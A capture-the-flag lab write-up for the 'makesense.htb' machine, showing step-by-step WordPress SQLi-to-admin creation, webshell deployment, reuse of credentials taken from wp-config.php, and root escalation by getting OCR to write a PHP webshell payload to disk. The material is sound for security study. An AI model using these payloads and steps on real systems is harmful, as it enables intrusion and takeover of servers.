

## 1. Reconnaissance

I began with an Nmap service scan to identify open ports and running services:

```
nmap -sV makesense.htb

Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-02 11:32 +0200
Nmap scan report for makesense.htb (10.129.246.24)
Host is up (0.051s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE    SERVICE     VERSION
22/tcp   open     ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
53/tcp   open     domain?
80/tcp   filtered http
443/tcp  open     ssl/http    Apache httpd 2.4.58
8001/tcp filtered vcom-tunnel
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.67 seconds
```

Port 443 hosts an Apache server (likely fronting a WordPress installation), while port 8001 appears filtered from an external perspective — this will become relevant during privilege escalation.

## 2. Enumeration

Enumeration revealed a WordPress installation vulnerable to a known CVE chain allowing unauthenticated remote code execution. I used `wp2shell`, a public PoC tool, to exploit it:

```
python3 wp2shell.py

  ██████╗  ██████╗ ██████╗      ██████╗ ██╗
 ██╔══██╗██╔═══██╗██╔════╝     ╚════██╗╚██╗
 ██████╔╝██║   ██║██║           █████╔╝ ██║
 ██╔═══╝ ██║   ██║██║          ██╔═══╝  ██║
 ██║     ╚██████╔╝╚██████╗     ███████╗██╔╝
 ╚═╝      ╚═════╝  ╚═════╝     ╚══════╝╚═╝

  CVE-2026-63030  +  CVE-2026-60137
  REST batch route confusion → unauthenticated SQLi → RCE
  WordPress 6.9.0–7.0.1  |  research PoC v2.0-research

  ⚠  For authorised security research on systems you own
  ⚠  or may test in writing. Delete artifacts after use.

  → Target list file (e.g. list.txt) or single URL [list.txt]: https://makesense.htb
[+] Loaded 1 target(s)
    · https://makesense.htb
  → Worker threads (applied when running against all 1 target(s)) [1]: 1
  → Output file for ALL results (blank = no file, e.g. result.txt): 

────────────────────────────────────────────────────────────
  TARGET   https://makesense.htb
────────────────────────────────────────────────────────────
  [1]  Fingerprint + confirm vulnerability (non-destructive)
  [2]  Blind SQL extraction  (fingerprint / dump users)
  [3]  Pre-Auth Admin creation  (UNION SQLi → new admin account, no webshell)
  [4]  Full RCE chain  →  admin creation + webshell
  [5]  Facilitated sink SQLi  (WordPress 6.8.x / custom)
  [6]  Threaded scan over URL list
  [7]  Transport settings  (proxy, TLS, timeout, delay)
  [8]  Change target URL
  [0]  Quit
────────────────────────────────────────────────────────────
```

### Step 1 — Pre-authentication administrator creation

```
→ Select option: 3

────────────────────────────────────────────────────────────
  CREATE ADMIN — Pre-Auth Admin RCE Chain
────────────────────────────────────────────────────────────
  ⚠  Unauthenticated UNION SQLi → new WordPress administrator.
  ⚠  No password cracking. No webshell. Non-destructive admin only.

  → Target uses SQLite? (WP-SQLite plugin) (y/N) [n]: y
  → Verify the generated credentials by logging in? (Y/n) [y]: y
  → Output file (blank = skip, e.g. result.txt): 
  → Confusion carrier variant (posts/categories) [posts]: 

[+] Batch endpoint reachable at https://makesense.htb/?rest_route=/batch/v1
[+] Route confusion confirmed (block_cannot_read marker).

[*] Pre-Auth Admin RCE Chain  (no credentials, no hash cracking)
────────────────────────────────────────────────────────────
[*] Checking UNION SQLi primitive availability...
[*] UNION channel confirmed — can forge fake wp_posts rows.
[*] Extracting wp_posts table name from sqlite_master...
[*] Posts table: wp_posts  (prefix: wp_)
[*] Extracting first existing administrator user ID...
[*] Source admin ID: 1
[*] Locating a public post for oEmbed anchor URLs...
[*] Public post anchor: https://makesense.htb/?p=1
[*] Seeding oEmbed cache posts (one per embed URL)...
[*]   Seeded embed 1/3.
[*]   Seeded embed 2/3.
[*]   Seeded embed 3/3.
[*] Recovering oEmbed cache post IDs from database...
[*]   Cache post #1: 188
[*]   Cache post #2: 189
[*]   Cache post #3: 190
[*] All cache post IDs recovered.
[*] Building poison graph and firing customizer user-create batch...
────────────────────────────────────────────────────────────
[+] Administrator created successfully!
  Username : wp2_f5a733023765
  Password : Wp2!-7sFhV3vevs9Jugwxa7Z
  Email    : wp2_f5a733023765@wp2shell.invalid
  Source admin ID : 1
  Table prefix    : wp_
────────────────────────────────────────────────────────────
[*] Verifying login with generated credentials...
[+] Login verified via wp-login.php — account is active and administrator-capable.
[!] mm.zip not found beside the script — skipping plugin install.
[!] Remember to remove the generated administrator when testing is complete.
```

A new WordPress administrator account was successfully created:

```
Username : wp2_f5a733023765
Password : Wp2!-7sFhV3vevs9Jugwxa7Z
```

### Step 2 — Webshell deployment via plugin upload

With valid administrator credentials in hand, I proceeded to the full RCE chain:

```
  → Select option: 4

────────────────────────────────────────────────────────────
  SHELL — RCE via webshell plugin upload
────────────────────────────────────────────────────────────
  This operation uploads a PHP plugin to the target.
  → Proceed? (y/N) [n]: y
  → Supply existing admin credentials? (y/N) [n]: y
  → Admin username: wp2_f5a733023765
  → Admin password: Wp2!-7sFhV3vevs9Jugwxa7Z
  → OS command to run (blank = interactive shell) [id]: 
  → Open interactive shell after command? (y/N) [n]: y
  → SLEEP() delay for time-based fallback (s) [8.0]: 
  → Table prefix for time-based extraction [wp_]: 
  → Confusion carrier variant (posts/categories) [posts]: 

[*] Using supplied credentials for 'wp2_f5a733023765'.
[!] This uploads a plugin containing a webshell to the target.
[*] Authenticating as 'wp2_f5a733023765' ...
[+] Authenticated.
[!] mm.zip not found beside the script — skipping plugin install.
[*] Deploying webshell plugin ...
[+] Webshell deployed: https://makesense.htb/wp-content/plugins/wp2shell_456609b7/wp2shell_456609b7.php

uid=33(www-data) gid=33(www-data) groups=33(www-data)

[*] Interactive shell — 'exit' or Ctrl-D to quit.
/var/www/html/wp-content/plugins/wp2shell_456609b7 $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Remote code execution was confirmed as `www-data`.

## 3. Foothold

With a shell as `www-data`, I searched for stored credentials within the WordPress configuration:

```
/var/www/html $ grep -r "DB_PASSWORD\|DB_NAME\|DB_USER" /var/www/html/wp-config.php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
```

The database user `walter` matched a system account, and the extracted password turned out to be reused for SSH access.

## 4. User Flag

```
ssh walter@makesense.htb
# authenticated using the password recovered from wp-config.php

cat user.txt
8285949245dd21981b68b0ef4d2142eb
```

## 5. Privilege Escalation

### 5.1 Service discovery

Enumerating locally bound services as `walter` revealed an internal web application listening on port 8001:

```
ss -tulnp
Netid       State        Recv-Q       Send-Q             Local Address:Port              Peer Address:Port       Process       
udp         UNCONN       0            0                     127.0.0.54:53                     0.0.0.0:*                        
udp         UNCONN       0            0                  127.0.0.53%lo:53                     0.0.0.0:*                        
udp         UNCONN       0            0                        0.0.0.0:68                     0.0.0.0:*                        
tcp         LISTEN       0            10                     127.0.0.1:44245                  0.0.0.0:*                        
tcp         LISTEN       0            5                      127.0.0.1:46509                  0.0.0.0:*                        
tcp         LISTEN       0            511                      0.0.0.0:80                     0.0.0.0:*                        
tcp         LISTEN       0            4096                     0.0.0.0:22                     0.0.0.0:*                        
tcp         LISTEN       0            4096                   127.0.0.1:8001                   0.0.0.0:*                        
tcp         LISTEN       0            511                      0.0.0.0:443                    0.0.0.0:*                        
tcp         LISTEN       0            4096               127.0.0.53%lo:53                     0.0.0.0:*                        
tcp         LISTEN       0            4096                  127.0.0.54:53                     0.0.0.0:*                        
```

```
curl -I localhost:8001
HTTP/1.0 401 Unauthorized
Host: localhost:8001
Date: Fri, 02 Oct 2026 14:08:19 GMT
Connection: close
X-Powered-By: PHP/8.3.6
Set-Cookie: PHPSESSID=2bkj1jl50sjqaag8kc2nukak00; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
WWW-Authenticate: Basic realm="OCR Protected"
Content-type: text/html; charset=UTF-8
```

Checking the running processes confirmed this service was a **PHP built-in server running as root**:

```
ps aux | grep 8001
root        1402  0.0  0.7 228488 31352 ?        S    09:30   0:02 php -S 127.0.0.1:8001 -t /root/ocr4/
walter     74213  0.0  0.0   6544  2284 pts/0    S+   14:08   0:00 grep --color=auto 8001
```

This was a strong privilege escalation lead: any code executed through this application would run with root privileges.

The Basic Auth prompt suggested reusing the credentials already recovered from `wp-config.php`:

```
curl -u walter:JbhHDAEgXvri3! http://127.0.0.1:8001/

<!DOCTYPE html>
<html lang="en">
<head>
...
```

Access confirmed — the application was a handwriting/drawing-to-text OCR tool ("MakeSense") built on Tesseract.

### 5.2 Tunneling the service locally

To interact with the application comfortably through Burp Suite, I forwarded the remote port over SSH:

```
ssh -L 9191:localhost:8001 walter@makesense.htb
```

### 5.3 Exploiting the OCR-to-file-save feature

Analysis of the application traffic revealed two relevant endpoints:

1. A recognition endpoint accepting a canvas drawing as a base64-encoded PNG (`canvas_image` parameter), which runs it through Tesseract and returns an `ocr_id` along with the recognized text.
2. A "save output" endpoint that writes the OCR'd text to an arbitrary file on disk, based on a user-supplied `ocr_id` and `filename`.

Since the application writes attacker-controlled text to an attacker-chosen filename, this is a straightforward path to a PHP webshell: submit an image containing PHP code as the "handwriting," let Tesseract transcribe it, then save the result as a `.php` file.

**Step 1 — Generate a clean image containing the PHP payload.**

Using a rendered font rather than a hand-drawn sketch dramatically improves OCR accuracy:

```python
from PIL import Image, ImageDraw, ImageFont

img = Image.new('RGB', (800, 150), color='white')
d = ImageDraw.Draw(img)
font = ImageFont.truetype("/System/Library/Fonts/Helvetica.ttc", 40)
d.text((10, 50), '<?php system($_GET["cmd"]); ?>', fill='black', font=font)
img.save('payload.png')
```

> **Note:** using single quotes (`'`) around the payload is risky — Tesseract frequently misreads straight apostrophes as curly/typographic quotes, breaking the PHP syntax. Double quotes proved far more reliable for recognition.

**Step 2 — Base64-encode the image:**

```bash
base64 -i payload.png | tr -d '\n' > payload.b64
```

**Step 3 — Submit it to the recognition endpoint via Burp Repeater**, replacing the `canvas_image` value with the URL-encoded base64 payload:

```
POST / HTTP/1.1
Host: localhost:9191
Authorization: Basic d2FsdGVyOkpiaEhEQUVnWHZyaTMh
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=7goep6d71vvgtoko2ogca70a33

canvas_image=data%3Aimage%2Fpng%3Bbase64%2C<base64-encoded PNG>
```

The response confirmed correct recognition of the payload and returned a fresh `ocr_id`.

**Step 4 — Save the recognized text as a PHP file:**

```
POST / HTTP/1.1
Host: localhost:9191
Authorization: Basic d2FsdGVyOkpiaEhEQUVnWHZyaTMh
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=7goep6d71vvgtoko2ogca70a33

ocr_id=ocr_6abfcd7fb89341.72844632&filename=payload.php&save_output=1
```

The application responded with:

```
Saved as: saved/payload.php
```

### 5.4 Confirming root-level code execution

Since the application runs as root, any command executed through the webshell inherits root privileges. Accessing the saved file directly confirmed this:

```
http://localhost:9191/saved/payload.php?cmd=cat%20/root/root.txt
```

```
c6afd3ffcb137335c0ff13a201aa5a78
```

## 6. Root Flag

```
c6afd3ffcb137335c0ff13a201aa5a78
```

